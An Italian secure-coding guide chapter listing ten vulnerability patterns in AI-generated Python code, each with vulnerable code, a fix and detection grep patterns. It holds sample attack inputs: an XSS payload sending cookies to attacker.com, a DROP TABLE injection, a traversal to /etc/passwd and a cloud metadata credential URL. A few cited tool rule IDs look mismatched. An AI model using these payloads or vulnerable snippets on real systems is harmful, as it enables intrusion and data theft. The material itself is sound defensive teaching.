# 4) Pattern di Vulnerabilità Ricorrenti nel Codice AI-Generato

[Torna all'indice](../README.md)

---

> [!NOTE]
> Questo capitolo approfondisce il rischio **R-05** del catalogo. Documenta i pattern di vulnerabilità più frequentemente introdotti dai modelli AI durante la generazione di codice, con esempi pratici, metodi di rilevazione e correzione. Per praticità e con l’aiuto degli agenti AI per la costruzione di questo capitolo, gli esempi usano Python come linguaggio principale, con integrazioni in altri linguaggi ove rilevante per il pattern descritto.

---

## Perché l'AI genera codice sistematicamente vulnerabile

I modelli LLM ottimizzano per la **plausibilità sintattica**: il codice generato è quasi sempre compilabile e funzionalmente corretto per i casi d'uso comuni. Il problema è che la sicurezza raramente è visibile nei test superficiali — una query SQL injection funziona perfettamente finché non arriva un attaccante.

Il [Veracode 2025 GenAI Code Security Report](https://blog.barrack.ai/every-ai-app-data-breach-2025-2026/) ha identificato tre cause strutturali:

1. **Bias del training**: il codice open source su cui i modelli vengono addestrati contiene storicamente molte più vulnerabilità che best practice di sicurezza, perché la sicurezza è documentata nei blog e negli advisory, non nel codice di esempio.
2. **Mancanza di contesto di sicurezza**: l'AI non conosce il threat model dell'applicazione. Genera il codice più semplice che soddisfa la richiesta funzionale.
3. **Ottimizzazione per la brevità**: le versioni sicure del codice sono quasi sempre più lunghe e complesse. L'AI tende verso le soluzioni più compatte.

I pattern che seguono non sono casi rari o estremi: sono i comportamenti rilevati sistematicamente su centinaia di task di coding.

---

## BUG-01 · SQL Injection

**Frequenza:** Alta (40% delle query SQL AI-generate — Veracode 2025)

### Il problema

L'AI costruisce query SQL per concatenazione di stringhe invece di usare query parametrizzate. È il pattern più semplice da scrivere e il più pericoloso: permette a un attaccante di modificare la struttura della query SQL, leggere dati non autorizzati, modificarli o cancellare l'intero database.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "scrivi una funzione che cerca un utente per username"
def get_user(username: str, conn):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor = conn.cursor()
    cursor.execute(query)
    return cursor.fetchone()
```

Con `username = "admin' OR '1'='1"` la query diventa:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```
…che restituisce tutti gli utenti del database.

Con `username = "'; DROP TABLE users; --"` si ottiene la cancellazione della tabella.

### Versione corretta

```python
# ✅ SICURO — query parametrizzata
def get_user(username: str, conn):
    query = "SELECT * FROM users WHERE username = ?"  # placeholder, non interpolazione
    cursor = conn.cursor()
    cursor.execute(query, (username,))                # il valore è separato dalla query
    return cursor.fetchone()
```

Con SQL Server / pyodbc il placeholder è `?`. Con PostgreSQL / psycopg2 è `%s`. Con SQLAlchemy si usano le ORM expression.

### Come rilevarlo

**Tool automatici:**
- `bandit` (Python): rileva pattern di SQL concatenation → `bandit -r . -t B608`
- `semgrep` con ruleset `python.lang.security.audit.formatted-sql-query`
- SonarQube: regola `S3649` (SQL injection)
- GitHub Advanced Security: CodeQL query `python/sql-injection`

**Pattern da cercare nel code review:**
```
# Ricerca manuale — segnali di allarme:
grep -rn "f\"SELECT\|f\"INSERT\|f\"UPDATE\|f\"DELETE" .
grep -rn "% username\|% user_id\|format().*WHERE" .
grep -rn "\"SELECT.*\" +" .   # concatenazione con +
```

**Domanda da porsi nel review:** *"Il valore che entra nella query viene da input esterno (parametro HTTP, file, database di terze parti)? Se sì, è separato dalla struttura SQL o concatenato?"*

---

## BUG-02 · Cross-Site Scripting (XSS)

**Frequenza:** Molto Alta (86% di fallimento nei test Veracode 2025)

### Il problema

L'AI inserisce dati provenienti dall'utente direttamente nell'HTML della risposta senza escape. Un attaccante può iniettare JavaScript che viene eseguito nel browser delle vittime, rubando cookie di sessione, credenziali salvate o reindirizzando verso siti malevoli.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "crea un endpoint Flask che mostra il nome dell'utente"
from flask import Flask, request

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    return f"<h1>Benvenuto, {name}!</h1>"   # input non sanificato nell'HTML
```

Con `name = <script>document.location='https://attacker.com/steal?c='+document.cookie</script>` il browser della vittima esegue il JavaScript iniettato.

### Versione corretta

```python
# ✅ SICURO — escape dell'output con markupsafe
from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = escape(request.args.get("name", "Guest"))  # escape prima del rendering
    return f"<h1>Benvenuto, {name}!</h1>"
```

Oppure, meglio ancora, usare i template Jinja2 che eseguono l'escape automaticamente:

```python
# ✅ SICURO — template con auto-escape
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    return render_template_string("<h1>Benvenuto, {{ name }}!</h1>", name=name)
    # Jinja2 esegue l'escape di name automaticamente
```

> [!WARNING]
> `render_template_string` con f-string è ugualmente vulnerabile: `render_template_string(f"<h1>{name}</h1>")` — l'escape avviene solo per le variabili passate come parametri al template, non per quelle interpolate prima.

### Come rilevarlo

**Tool automatici:**
- `bandit`: rileva pattern XSS in Flask/Django → `bandit -r . -t B703,B704`
- `semgrep` ruleset `python.flask.security.audit.render-template-string`
- Browser DevTools: verificare manualmente che l'output HTML di ogni endpoint che mostra dati utente faccia escape dei caratteri `<`, `>`, `"`, `'`, `&`

**Pattern da cercare nel code review:**
```
grep -rn "return f\"<\|return \"<" .          # HTML costruito con f-string
grep -rn "render_template_string(f" .          # template_string con f-string (vulnerabile)
grep -rn "innerHTML\s*=" .                     # JavaScript che scrive HTML (lato client)
grep -rn "document.write(" .                   # JavaScript che scrive HTML direttamente
```

---

## BUG-03 · Log Injection

**Frequenza:** Molto Alta (88% di fallimento nei test Veracode 2025)

### Il problema

L'AI logga input non sanitizzati. Un attaccante può iniettare newline e sequenze di escape nei dati loggati, falsificando le entry di log per coprire attività malevole o per confondere l'analisi degli incident. In scenari avanzati, se i log vengono processati da sistemi di analisi (SIEM, Elasticsearch), l'injection può portare a ulteriori vulnerabilità.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "logga i tentativi di login falliti"
import logging

logger = logging.getLogger(__name__)

def login(username: str, password: str):
    if not authenticate(username, password):
        logger.warning(f"Login fallito per utente: {username}")  # username non sanitizzato
        return False
    return True
```

Con `username = "pippo\nWARNING: Login riuscito per utente: admin"` il log diventa:
```
WARNING: Login fallito per utente: pippo
WARNING: Login riuscito per utente: admin   ← riga iniettata dall'attaccante
```

### Versione corretta

```python
# ✅ SICURO — rimozione dei caratteri di controllo prima del log
import logging
import re

logger = logging.getLogger(__name__)

def sanitize_for_log(value: str) -> str:
    """Rimuove newline e caratteri di controllo per prevenire log injection."""
    return re.sub(r'[\r\n\t]', '_', value)

def login(username: str, password: str):
    safe_username = sanitize_for_log(username)
    if not authenticate(username, password):
        logger.warning("Login fallito per utente: %s", safe_username)  # anche: no f-string nel log
        return False
    return True
```

> [!TIP]
> Usare `logger.warning("testo: %s", valore)` invece di `logger.warning(f"testo: {valore}")` è buona pratica per due motivi: evita la formattazione della stringa se il livello di log non è attivo, e rende più esplicito che `valore` è un dato esterno.

### Come rilevarlo

**Tool automatici:**
- `semgrep` ruleset `python.lang.security.audit.logging-injection`
- Review manuale: cercare tutti i punti di log che includono dati provenienti da request HTTP, file, o input utente

**Pattern da cercare nel code review:**
```
grep -rn "logger\.\(debug\|info\|warning\|error\|critical\)(f\"" .  # f-string nei log
grep -rn "logging\.\(debug\|info\|warning\|error\)(f\"" .
grep -rn "print(f\".*request\|print(f\".*username\|print(f\".*user_input" .
```

---

## BUG-04 · Path Traversal (Directory Traversal)

**Frequenza:** Media

### Il problema

L'AI costruisce percorsi di file usando direttamente input dell'utente senza validare che il percorso risultante sia all'interno della directory consentita. Un attaccante può leggere file arbitrari del sistema — inclusi `/etc/passwd`, chiavi SSH, file `.env`, configurazioni di sistema.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "crea un endpoint che serve file statici da una cartella uploads"
import os
from flask import Flask, request, send_file

app = Flask(__name__)
UPLOAD_DIR = "/app/uploads"

@app.route("/file")
def serve_file():
    filename = request.args.get("name")
    filepath = os.path.join(UPLOAD_DIR, filename)   # join non è sufficiente
    return send_file(filepath)
```

Con `name = "../../etc/passwd"`, `os.path.join` produce `/app/uploads/../../etc/passwd` che risolve a `/etc/passwd`.

### Versione corretta

```python
# ✅ SICURO — validazione che il percorso risolto sia dentro la directory consentita
import os
from flask import Flask, request, send_file, abort

app = Flask(__name__)
UPLOAD_DIR = os.path.realpath("/app/uploads")   # percorso canonico assoluto

@app.route("/file")
def serve_file():
    filename = request.args.get("name", "")
    # Risolve il percorso completo eliminando .. e symlink
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))

    # Verifica che il percorso risolto sia ancora dentro UPLOAD_DIR
    if not filepath.startswith(UPLOAD_DIR + os.sep):
        abort(403)   # accesso negato

    if not os.path.isfile(filepath):
        abort(404)

    return send_file(filepath)
```

### Come rilevarlo

**Tool automatici:**
- `bandit`: regola `B610` per path traversal
- `semgrep` ruleset `python.flask.security.audit.secure-set-cookie`

**Pattern da cercare nel code review:**
```
grep -rn "os.path.join.*request\|os.path.join.*args\|os.path.join.*params" .
grep -rn "open(.*request\|open(.*args\." .
grep -rn "send_file\|send_from_directory" .   # tutti i punti di serving file
```

**Domanda da porsi nel review:** *"Dopo `os.path.join`, viene verificato che il percorso risultante sia ancora all'interno della directory consentita?"*

---

## BUG-05 · Credenziali Hardcoded

**Frequenza:** Alta

### Il problema

L'AI inserisce credenziali direttamente nel codice — spesso come valori di default o in configurazioni di esempio. Questo pattern è estremamente comune perché l'AI ottimizza per "codice che funziona subito": includere la password direttamente è la strada più breve per soddisfare la richiesta. Le credenziali hardcoded finiscono nel repository e, anche se rimosse successivamente, restano nella storia di git.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "crea una connessione al database SQL Server"
import pyodbc

def get_connection():
    conn_str = (
        "DRIVER={ODBC Driver 18 for SQL Server};"
        "SERVER=myserver.database.windows.net;"
        "DATABASE=mydb;"
        "UID=admin;"
        "PWD=MyPassword123!"   # credenziale hardcoded
    )
    return pyodbc.connect(conn_str)
```

```python
# ❌ VULNERABILE — variante con JWT secret
app.config["SECRET_KEY"] = "super-secret-key-123"   # segreto hardcoded
```

### Versione corretta

```python
# ✅ SICURO — credenziali da variabili d'ambiente
import os
import pyodbc
from dotenv import load_dotenv   # solo in sviluppo locale, non in produzione

load_dotenv()   # carica .env se presente (il .env NON va in git)

def get_connection():
    conn_str = (
        "DRIVER={ODBC Driver 18 for SQL Server};"
        f"SERVER={os.environ['DB_SERVER']};"
        f"DATABASE={os.environ['DB_NAME']};"
        f"UID={os.environ['DB_USER']};"
        f"PWD={os.environ['DB_PASSWORD']};"
    )
    return pyodbc.connect(conn_str)
```

In produzione, le variabili d'ambiente vengono iniettate dall'orchestratore (Kubernetes secrets, Azure Key Vault, AWS Secrets Manager) — mai da un file `.env` deployato.

> [!CAUTION]
> Rimuovere una credenziale hardcoded con un commit successivo **non è sufficiente**: la storia di git contiene ancora il valore. Se una credenziale è finita in un commit, va considerata compromessa e va ruotata immediatamente, anche su branch privati (i branch privati possono diventare pubblici).

### Come rilevarlo

**Tool automatici:**
- `git-secrets` (AWS): scansiona i commit prima del push
- `truffleHog`: scansiona la storia completa di git per pattern di credenziali
- `detect-secrets` (Yelp): pre-commit hook che blocca il commit se rileva potenziali segreti
- GitHub Secret Scanning: attivo automaticamente per tutti i repo pubblici GitHub, opzionale per i privati con piano Advanced Security
- `semgrep` ruleset `generic.secrets`

**Configurazione pre-commit hook (`.pre-commit-config.yaml`):**
```yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
```

**Pattern da cercare nel code review:**
```
grep -rn "password\s*=\s*['\"].\+['\"]" .
grep -rn "secret\s*=\s*['\"].\+['\"]" .
grep -rn "api_key\s*=\s*['\"].\+['\"]" .
grep -rn "token\s*=\s*['\"].\+['\"]" .
```

---

## BUG-06 · Information Disclosure negli Error Handler

**Frequenza:** Alta

### Il problema

L'AI gestisce le eccezioni restituendo stack trace completi o messaggi di errore interni nelle risposte HTTP. Questi messaggi rivelano all'attaccante informazioni preziose: struttura del codice, versioni delle librerie, percorsi di file, query SQL, nomi di tabelle e colonne del database.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "aggiungi gestione degli errori all'endpoint"
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/user/<int:user_id>")
def get_user(user_id):
    try:
        user = db.query(f"SELECT * FROM users WHERE id = {user_id}")
        return jsonify(user)
    except Exception as e:
        return jsonify({"error": str(e)}), 500  # espone l'eccezione completa al client
```

La risposta in caso di errore potrebbe essere:
```json
{
  "error": "pyodbc.ProgrammingError: ('42S02', \"[42S02] [Microsoft][ODBC Driver] Invalid object name 'users'. (208) (SQLExecDirectW)\")"
}
```
…rivelando il driver ODBC, la versione, la struttura del database.

### Versione corretta

```python
# ✅ SICURO — log interno dell'errore, messaggio generico al client
import logging
from flask import Flask, request, jsonify

app = Flask(__name__)
logger = logging.getLogger(__name__)

@app.route("/user/<int:user_id>")
def get_user(user_id):
    try:
        user = db.get_user(user_id)   # query parametrizzata in una funzione separata
        if user is None:
            return jsonify({"error": "Not found"}), 404
        return jsonify(user)
    except Exception:
        logger.exception("Errore nel recupero utente id=%s", user_id)  # log completo interno
        return jsonify({"error": "Si è verificato un errore interno"}), 500  # messaggio generico
```

### Come rilevarlo

**Pattern da cercare nel code review:**
```
grep -rn "str(e)\|str(err)\|str(ex)\|str(exception)" .   # eccezione convertita in stringa
grep -rn "traceback.format_exc()" .                        # stack trace nella risposta
grep -rn "return.*error.*str(" .                           # errore restituito come stringa
```

**Test manuale:** inviare intenzionalmente richieste malformate (ID non numerici, parametri mancanti, valori boundary) e verificare che la risposta HTTP non contenga informazioni interne.

---

## BUG-07 · Generazione Insicura di Token e Valori Random

**Frequenza:** Media

### Il problema

L'AI usa `random` (Python) o `Math.random()` (JavaScript) per generare token, identificatori di sessione, codici di reset password e simili. Questi generatori non sono crittograficamente sicuri: i loro output sono prevedibili dato un numero sufficiente di campioni. Un attaccante può predire i prossimi valori generati e falsificare token.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "genera un token di reset password"
import random
import string

def generate_reset_token():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(32))  # random NON è crittograficamente sicuro
```

```python
# ❌ VULNERABILE — variante con timestamp
import time
def generate_session_id():
    return str(int(time.time())) + str(random.randint(1000, 9999))  # prevedibile
```

### Versione corretta

```python
# ✅ SICURO — secrets module (Python 3.6+, crittograficamente sicuro)
import secrets

def generate_reset_token():
    return secrets.token_urlsafe(32)   # 32 byte = 43 caratteri base64url, CSPRNG

def generate_session_id():
    return secrets.token_hex(16)       # 16 byte = 32 caratteri hex
```

Il modulo `secrets` usa il generatore di numeri casuali del sistema operativo (`/dev/urandom` su Linux/macOS, `CryptGenRandom` su Windows), che è progettato per uso crittografico.

### Come rilevarlo

**Tool automatici:**
- `bandit`: regola `B311` — rileva l'uso di `random` in contesti di sicurezza

**Pattern da cercare nel code review:**
```
grep -rn "import random" .
grep -rn "random\.choice\|random\.randint\|random\.random()" .
grep -rn "Math\.random()" .    # JavaScript
```

**Domanda da porsi nel review:** *"Il valore generato è usato per autenticazione, sessione, reset password, o identificatori che non devono essere indovinabili? Se sì, `random` è sbagliato."*

---

## BUG-08 · Server-Side Request Forgery (SSRF)

**Frequenza:** Media — in crescita con l'uso di AI agent

### Il problema

L'AI costruisce richieste HTTP verso URL forniti dall'utente senza validazione. Un attaccante può fornire URL interni (es. `http://169.254.169.254/` — il metadata service di AWS/Azure/GCP) per accedere a risorse interne non esposte pubblicamente, inclusi token di accesso cloud e configurazioni di sistema.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "crea un endpoint che fa il fetch di un URL e ne restituisce il contenuto"
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/fetch")
def fetch_url():
    url = request.args.get("url")
    response = requests.get(url)   # fetch di qualsiasi URL, inclusi interni
    return jsonify({"content": response.text})
```

Con `url = http://169.254.169.254/latest/meta-data/iam/security-credentials/` si ottengono le credenziali IAM dell'istanza cloud.

### Versione corretta

```python
# ✅ SICURO — allowlist di domini consentiti
import requests
from urllib.parse import urlparse
from flask import Flask, request, jsonify, abort

app = Flask(__name__)

ALLOWED_DOMAINS = {"api.example.com", "cdn.example.com"}  # allowlist esplicita

@app.route("/fetch")
def fetch_url():
    url = request.args.get("url", "")
    parsed = urlparse(url)

    # Verifica schema e dominio contro allowlist
    if parsed.scheme not in ("https",) or parsed.hostname not in ALLOWED_DOMAINS:
        abort(403)

    response = requests.get(url, timeout=5, allow_redirects=False)  # no redirect
    return jsonify({"content": response.text})
```

> [!IMPORTANT]
> Una blocklist (bloccare `localhost`, `127.0.0.1`, `169.254.x.x`) è **insufficiente**: può essere aggirata con redirect, encoding UTF-8, indirizzi IPv6 equivalenti, o DNS rebinding. La soluzione sicura è sempre un'**allowlist**.

### Come rilevarlo

**Tool automatici:**
- `semgrep` ruleset `python.requests.security.ssrf`
- `bandit`: regola `B310`

**Pattern da cercare nel code review:**
```
grep -rn "requests\.get(\|requests\.post(" .   # tutte le richieste HTTP
grep -rn "urllib\.request\.urlopen(" .
grep -rn "httpx\.get(\|aiohttp" .
```

Per ogni chiamata HTTP: verificare se l'URL (o parte di esso) può provenire da input esterno.

---

## BUG-09 · Missing Authentication e Authorization

**Frequenza:** Alta

### Il problema

L'AI implementa la funzionalità richiesta senza aggiungere i controlli di autenticazione e autorizzazione, specialmente quando il prompt non li menziona esplicitamente. Endpoint amministrativi, API interne e operazioni distruttive vengono creati senza protezione.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "crea un endpoint per eliminare un utente"
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/admin/user/<int:user_id>", methods=["DELETE"])
def delete_user(user_id):
    db.delete_user(user_id)
    return jsonify({"deleted": user_id})   # nessun controllo di autenticazione
```

```python
# ❌ VULNERABILE — IDOR (Insecure Direct Object Reference)
# Generato tipicamente da: "crea un endpoint per vedere il profilo di un utente"
@app.route("/user/<int:user_id>/profile")
def get_profile(user_id):
    return jsonify(db.get_profile(user_id))  # chiunque può vedere il profilo di chiunque
```

### Versione corretta

```python
# ✅ SICURO — autenticazione e autorizzazione esplicite
from flask import Flask, request, jsonify, abort
from flask_jwt_extended import jwt_required, get_jwt_identity

app = Flask(__name__)

@app.route("/admin/user/<int:user_id>", methods=["DELETE"])
@jwt_required()                        # autenticazione: richiede JWT valido
def delete_user(user_id):
    current_user = get_jwt_identity()
    if not current_user.get("is_admin"):  # autorizzazione: solo admin
        abort(403)
    db.delete_user(user_id)
    return jsonify({"deleted": user_id})


@app.route("/user/<int:user_id>/profile")
@jwt_required()
def get_profile(user_id):
    current_user_id = get_jwt_identity().get("id")
    if current_user_id != user_id:        # autorizzazione: solo il proprio profilo
        abort(403)
    return jsonify(db.get_profile(user_id))
```

### Come rilevarlo

**Pattern da cercare nel code review:**
```
grep -rn "@app.route" .                         # tutti gli endpoint
grep -rn "methods=\[.DELETE.\|methods=\[.PUT." . # operazioni distruttive
grep -rn "/admin\|/internal\|/management" .     # path amministrativi
```

Per ogni endpoint trovato, verificare che esista un decorator di autenticazione (es. `@jwt_required()`, `@login_required`) e che ci sia un controllo esplicito dei permessi per operazioni sensibili.

---

## BUG-10 · Insecure Deserialization

**Frequenza:** Bassa — ma impatto Critico

### Il problema

L'AI usa `pickle` (Python) per serializzare e deserializzare dati, inclusi dati provenienti dall'utente. `pickle` è intrinsecamente non sicuro: un oggetto pickle malevolo può eseguire codice arbitrario durante la deserializzazione. Non esiste un modo sicuro di usare `pickle` su dati non fidati.

### Codice vulnerabile (come lo genera l'AI)

```python
# ❌ VULNERABILE — generato tipicamente da: "deserializza i dati della sessione dal cookie"
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/profile")
def profile():
    session_data = request.cookies.get("session")
    user = pickle.loads(base64.b64decode(session_data))   # CRITICO: esegue codice arbitrario
    return f"Benvenuto, {user['name']}"
```

Un attaccante che controlla il cookie può costruire un payload pickle che esegue `os.system("rm -rf /")` o apre una reverse shell al momento della deserializzazione.

### Versione corretta

```python
# ✅ SICURO — JSON per dati semplici, itsdangerous per sessioni firmate
from flask import Flask, session
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = os.environ["SECRET_KEY"]   # Flask usa itsdangerous internamente per le sessioni

@app.route("/profile")
def profile():
    # Flask session è automaticamente firmata con HMAC — usa JSON internamente, non pickle
    user_name = session.get("name", "Guest")
    return f"Benvenuto, {user_name}"
```

Per dati strutturati complessi: usare `json`, `msgpack`, o `protobuf` — mai `pickle` su dati non fidati.

### Come rilevarlo

**Tool automatici:**
- `bandit`: regola `B301` — rileva l'uso di `pickle.loads`
- `semgrep` ruleset `python.lang.security.deserialization`

**Pattern da cercare nel code review:**
```
grep -rn "pickle\.loads\|pickle\.load(" .
grep -rn "import pickle" .
grep -rn "yaml\.load(" .    # yaml.load è equivalentemente pericoloso — usare yaml.safe_load
```

---

## Riepilogo: Tool di Rilevazione per Pipeline CI/CD

Una pipeline CI/CD efficace integra più livelli di verifica automatica:

| Fase | Tool | Cosa rileva |
|---|---|---|
| Pre-commit | `detect-secrets` | Credenziali hardcoded nel codice |
| Pre-commit | `bandit` | Vulnerabilità Python (SQL, XSS, pickle, random) |
| Pull Request | `semgrep` (CI) | Pattern di vulnerabilità personalizzabili |
| Pull Request | `CodeQL` (GitHub) | Analisi del flusso dei dati (SQL injection, XSS, path traversal) |
| Pull Request | `truffleHog` | Segreti nella storia git |
| Build | `safety` / `pip-audit` | Dipendenze Python con CVE noti |
| Build | `npm audit` / `Snyk` | Dipendenze JavaScript con CVE noti |
| Deploy | DAST (OWASP ZAP) | Vulnerabilità rilevabili a runtime sull'applicazione deployata |

> [!TIP]
> Nessun tool automatico copre il 100% dei casi. Il code review umano rimane essenziale, specialmente per BUG-08 (SSRF) e BUG-09 (Missing Authorization), dove la correttezza dipende dal contesto applicativo che gli analyzer statici non conoscono.

---

## Checklist di Code Review per Codice AI-Generato

Per ogni Pull Request che include codice AI-generato, verificare sistematicamente:

- [ ] **SQL**: le query che includono variabili usano parametri, non concatenazione o f-string
- [ ] **HTML output**: i dati utente vengono escaped prima di essere inclusi nell'HTML
- [ ] **Log**: gli input non fidati vengono sanitizzati prima di essere loggati
- [ ] **File path**: i percorsi costruiti da input utente vengono verificati contro la directory base con `realpath`
- [ ] **Credenziali**: nessuna password, chiave API o segreto è hardcoded — tutte da variabili d'ambiente
- [ ] **Error handling**: le eccezioni vengono loggante internamente, non restituite al client
- [ ] **Token/Random**: i valori usati per sicurezza usano `secrets`, non `random`
- [ ] **HTTP fetch**: gli URL costruiti da input utente sono validati contro una allowlist
- [ ] **Autenticazione**: ogni endpoint ha il decorator di autenticazione appropriato
- [ ] **Autorizzazione**: gli endpoint che restituiscono o modificano dati di uno specifico utente verificano che il richiedente sia autorizzato per quell'utente
- [ ] **Serializzazione**: nessun uso di `pickle.loads` o `yaml.load` su dati non fidati

---

[Torna all'indice](../README.md)

---

